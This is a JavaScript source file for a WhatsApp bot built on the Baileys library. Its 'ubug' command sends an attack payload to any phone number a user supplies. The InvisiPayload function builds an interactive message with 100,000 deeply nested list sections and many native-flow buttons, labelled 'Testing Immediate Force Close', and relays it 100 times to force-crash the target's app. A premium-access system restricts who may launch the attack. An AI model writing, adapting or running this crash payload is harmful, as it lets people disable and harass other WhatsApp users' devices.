const {
  generateWAMessageFromContent,
  proto,
} = require("@whiskeysockets/baileys");
const { ownerNumber } = require("./config.js");
const prefix = [".", "!", "#", "/", "$"];
const fs = require("fs");
const premiumPath = "./database/premium.json";
const premium = JSON.parse(fs.readFileSync(premiumPath));

const isPremium = (number) => {
  let position = false;
  premium.forEach((data, i) => {
    if (data.id === number) {
      position = i;
    }
  });

  if (position !== false) {
    if (Date.now() >= premium[position].expired) {
      premium.splice(position, 1);
      fs.writeFileSync(premiumPath, JSON.stringify(premium, null, 2));
      return false;
    } else {
      return true;
    }
  } else {
    return false;
  }
};

const deletePremium = (number) => {
  let position = false;
  premium.forEach((data, i) => {
    if (data.id === number) {
      position = i;
    }
  });

  if (position !== false) {
    premium.splice(position, 1);
    fs.writeFileSync(premiumPath, JSON.stringify(premium, null, 2));
    return true;
  }
  return false;
};

async function GenexVictim(sock, msg) {
  try {
    if (!msg.message) return;

    const messageType = Object.keys(msg.message)[0];

    const body =
      messageType === "conversation"
        ? msg.message.conversation
        : messageType === "extendedTextMessage"
        ? msg.message.extendedTextMessage.text
        : "";

    const isCmd = prefix.some((p) => body.startsWith(p));
    if (!isCmd) return;

    const usedPrefix = prefix.find((p) => body.startsWith(p));
    const command = body
      .slice(usedPrefix.length)
      .trim()
      .split(/ +/)
      .shift()
      .toLowerCase();
    const args = body.slice(usedPrefix.length).trim().split(/ +/).slice(1);
    const q = args.join(" ");

    const sender = msg.key.fromMe
      ? sock.user.id
      : msg.key.participant || msg.key.remoteJid;
    const senderNumber = sender.split("@")[0].split(":")[0];
    const senderName = msg.pushName || "User";
    const isOwner = ownerNumber.includes(senderNumber);

    const isGroup = msg.key.remoteJid.endsWith('@g.us');
    const groupMetadata = isGroup ? await sock.groupMetadata(msg.key.remoteJid) : null;
    const groupName = isGroup ? groupMetadata.subject : '';

    const reply = (teks) => {
      sock.sendMessage(
        msg.key.remoteJid,
        {
          text: teks,
          contextInfo: {
            externalAdReply: {
              title: "ୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁୁ​᭄⃟🩸HASSAN",
              body: "𝐕3",
              previewType: "PHOTO",
              thumbnail: fs.readFileSync("./database/hassan.jpg"),
              sourceUrl: "https://wa.me/+923107612528",
            },
          },
        },
        { quoted: msg }
      );
    };

    async function InvisiPayload(targetNumber) {
      let sections = [];

      for (let i = 0; i < 100000; i++) {
        let largeText = "";

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let msg = generateWAMessageFromContent(
        targetNumber,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [targetNumber],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: targetNumber,
                  },
                },
                body: proto.Message.InteractiveMessage.Body.create({
                  text: "",
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                  subtitle: "Testing Immediate Force Close",
                  hasMediaAttachment: false, // No media to focus purely on data overload
                }),
                nativeFlowMessage:
                  proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "payment_method",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "call_permission_request",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                    ],
                  }),
              }),
            },
          },
        },
        { userJid: targetNumber }
      );

      await sock.relayMessage(targetNumber, msg.message, {
        participant: { jid: targetNumber },
        messageId: msg.key.id,
      });
    }

    const addPremium = (number, duration) => {
      const obj = {
        id: number,
        expired: Date.now() + duration,
      };
      premium.push(obj);
      fs.writeFileSync(premiumPath, JSON.stringify(premium, null, 2));
    };

    switch (command) {
      case "hassan":
      case "help":
        const menuText = `
        
        ◇ HASSAN◇

       Hassan

>Welcome

━━━━━━━━━━━━━━━━━━━━━━

         ◇ *Hassan*
 
 
> ubug 923×××××
 
 
* *Hassan⊘*
 `;
        reply(menuText);
        break;

      case "ubug":
        if (!isOwner && !isPremium(sender))
          return reply("Only for Hassan");
        if (!args[0])
          return reply(`⚠️ noooo!

◇ ᴇxᴀᴍᴘʟᴇ: ${usedPrefix}ᴜsᴀᴍᴀᴋɪʟʟ <ɴᴜᴍʙᴇʀ>
◇ ᴇxᴀᴍᴘʟᴇ: ${usedPrefix}ᴜsᴀᴍᴀᴋɪʟʟ 62812345xxxx
◇ ᴇxᴀᴍᴘʟᴇ: ${usedPrefix}ᴜsᴀᴍᴀᴋɪʟʟ 1234567xxxx

Note: 
      Hassan`);

        let number = args[0];
        number = number.replace(/[^0-9]/g, "");

        if (number.length < 7) {
          return reply(`⚠️ nooo
            
◇ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ ʟɪᴋʜᴏ
◇ ᴇxᴀᴍᴘʟᴇ: 92*******`);
        }

        const targetNumber = `${number}@s.whatsapp.net`;

        try {
          for (let i = 0; i < 100; i++) {
            await InvisiPayload(targetNumber);
          }
          reply(`Success Attack ${targetNumber} with ᴜsᴀᴍᴀᴋɪʟʟ!`);
          console.log(`Success Attack ${targetNumber} with Hassan`);
        } catch (err) {
          console.error("Hassan Error:", err);
          reply("⚠️ Sorry !");
        }
        break;

      case "addprem":
        if (!isOwner) return reply("⚠️ Only for Hassan");
        if (args.length < 2)
          return reply(`⚠️ Penggunaan salah!
        
◇ ᴇxᴀᴍᴘʟᴇ: ${usedPrefix}addprem <ɴᴜᴍʙᴇʀ> <ᴅᴀʏs>
◇ ᴇxᴀᴍᴘʟᴇ: ${usedPrefix}addprem 92**** 30d
◇ ᴇxᴀᴍᴘʟᴇ: ${usedPrefix}addprem 92**** 30d

Note: 
- Hassan`);

        let premnumber = args[0];
        premnumber = premnumber.replace(/[^0-9]/g, "");

        let timeFormat = args[1].toLowerCase();
        let multiplier;

        if (timeFormat.endsWith("s")) multiplier = 1000;
        else if (timeFormat.endsWith("m")) multiplier = 60000;
        else if (timeFormat.endsWith("h")) multiplier = 3600000;
        else if (timeFormat.endsWith("d")) multiplier = 86400000;
        else return reply("⚠️ Hassan!");

        let duration = parseInt(timeFormat.slice(0, -1)) * multiplier;
        if (isNaN(duration)) return reply("Sorry");

        try {
          addPremium(`${premnumber}@s.whatsapp.net`, duration);
          reply(`Sorry
          
◇ ɴᴜᴍʙᴇʀ: ${premnumber}
◇ ᴛɪᴍᴇ: ${timeFormat}
◇ Expired: ${new Date(Date.now() + duration).toLocaleString()}`);
        } catch (err) {
          console.error(err);
          reply("Hassan");
        }
        break;

      case "delprem":
        if (!isOwner) return reply("Hassan only !");
        if (!args[0])
          return reply(`Hassan
        
◇ ᴇxᴀᴍᴘʟᴇ: ${usedPrefix}delprem <ɴᴜᴍʙᴇʀ>
◇ ᴇxᴀᴍᴘʟᴇ: ${usedPrefix}delprem 92****
◇ ᴇxᴀᴍᴘʟᴇ: ${usedPrefix}delprem 92****

Note: 
      Hassan`);

        let delpremNumber = args[0];
        delpremNumber = delpremNumber.replace(/[^0-9]/g, "");

        try {
          const targetJid = `${delpremNumber}@s.whatsapp.net`;
          const success = deletePremium(targetJid);

          if (success) {
            reply(`Hassan
            
◇ Nomor: ${delpremNumber}`);
          } else {
            reply(`Hassan
            
◇ ɴᴜᴍʙᴇʀ ${delpremNumber} Hassan`);
          }
        } catch (err) {
          console.error(err);
          reply("Hassan");
        }
        break;

      default:
        break;
    }
  } catch (error) {
    console.error("Error:", error);
    reply("Hassan");
  }
}

module.exports = { GenexVictim };
